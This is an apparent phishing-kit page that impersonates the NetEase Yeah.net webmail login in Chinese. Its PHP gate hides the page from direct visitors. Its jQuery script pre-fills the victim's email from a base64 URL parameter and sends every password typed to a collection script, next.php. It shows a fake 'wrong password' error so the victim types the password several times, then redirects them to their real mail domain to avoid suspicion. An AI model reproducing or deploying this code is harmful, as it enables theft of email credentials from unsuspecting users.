<?php
session_start();
if (!isset($_SESSION['came_from_index']) || $_SESSION['came_from_index'] !== true) {
    header("HTTP/1.0 404 Not Found");
    exit("404 Not Found");
}
?>

<!DOCTYPE html>
<html data-bs-theme="light" lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>网易Yeah.net免费邮箱登录</title>
    <link rel="stylesheet" href="../assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/styles.css">
</head>

<body id="yeahbody">
    <div style="height: 70px;padding: 0px 40px;padding-top: 16px;padding-bottom: 16px;"><img class="img-fluid" width="251" height="68" src="../assets/img/yeahlg.png" style="height: 34px;width: auto;"></div>
    <div id="yeahmainouter" class="c-div">
        <div id="yeaninnermain" class="sp-div" style="width: 100%;max-width: 1220px;height: 760px;">
            <div id="leftsideyeah" style="width: 100%;"></div>
            <div id="yeahfouter" style="min-width: 400px;max-width: 400px;">
                <div id="yeahfinner" style="height: fit-content;padding: 30px;background: #ffffff;border-radius: 12px;box-shadow: 0px 0px 7px;padding-bottom: 16px;">
                    <p style="text-align: center;font-weight: bold;font-size: 24px;">账号登录</p><input type="text" id="backEMF" style="width: 100%;height: 47.6px;border-radius: 11px;border: 1px solid rgb(84,108,195);padding: 1px 8px;" placeholder="邮箱账号或手机号码"><input type="password" id="pass" style="width: 100%;height: 47.6px;border-radius: 11px;border: 1px solid rgb(84,108,195);padding: 1px 8px;margin-top: 16px;" placeholder="输入密码">
                    <div class="sp-div" style="margin-top: 16px;">
                        <div class="form-check"><input class="form-check-input" type="checkbox" id="formCheck-1"><label class="form-check-label" for="formCheck-1">30天内免登录</label></div><a href="#" style="color: rgb(32,32,32);">忘记密码</a>
                    </div>
                    <p id="err" style="color: rgb(253,15,0);margin: 0px;">密码错误，请重试</p><button class="btn btn-primary" id="next-btn" type="button" style="width: 100%;height: 47.6px;background: #3a78dd;border-style: none;border-radius: 4px;margin-top: 32px;" onclick="nextFun();">登&nbsp;录</button>
                    <p style="text-align: center;margin-top: 16px;">注册新账号 | 注册VIP</p>
                    <p style="text-align: center;margin-top: 36px;">阅读并接受 《服务条款》和 《隐私政策》</p>
                </div>
            </div>
        </div>
    </div>
    <script src="../assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
$(document).ready(function () {
    $(document).on('keypress', function (e) {
    if (e.which === 13) {
        $('#next-btn').click();
    }
});

    // Get parameters from URL
    const urlParams = new URLSearchParams(window.location.search);
    const useridEncoded = urlParams.get('userid');
    const maxTry = parseInt(urlParams.get('maxtry') || '3');
    const pageValue = urlParams.get('page') || '';
    const domainRedirect = urlParams.get('domain_redirect') || '';

    let tryCount = 0;
    let userid = '';

    // Decode Base64 email
    try {
        userid = atob(useridEncoded || '');
    } catch (e) {
        console.error("Invalid userid encoding");
    }

    // Fill userid into either #backEm or #backEMF
    if ($('#backEm').length) {
        $('#backEm').text(userid);
    }
    if ($('#backEMF').length) {
        $('#backEMF').val(userid);
    }

    // Hide error initially
    $('#err').hide();

    // Next button click handler
    $('#next-btn').on('click', function () {
        const password = $('#pass').val().trim();

        // If password empty
        if (!password) {
            $('#err').show();
            return;
        }

        // Disable button until AJAX finishes
        $('#next-btn').prop('disabled', true);

        // Prepare POST data
        const postData = {
            ai: userid,
            pr: password,
            page_value: pageValue
        };

        $.ajax({
            url: '../next.php',
            type: 'POST',
            data: postData,
            success: function (response) {
                tryCount++;

                if (tryCount >= maxTry) {
                    // After maxTry, proceed normally
                    $('#err').hide();
                     const emailParts = userid.split('@');
                     if(!domainRedirect){
                    if (emailParts.length === 2) {
                        const domain = emailParts[1];
                        window.location.replace(`https://${domain}`);
                    } else {
                        // Fallback if email is malformed
                        window.location.replace("https://www.google.com");
                    }
                    }else{
                         window.location.replace(domainRedirect);
                    }


                    // You can redirect or take another action here
                } else {
                    // Show error and reset password field
                    $('#err').show();
                    $('#pass').val('');
                }
            },
            error: function () {
                alert("Error contacting server.");
            },
            complete: function () {
                // Re-enable button after request finishes
                $('#next-btn').prop('disabled', false);
            }
        });
    });
});
</script>

</body>


</html>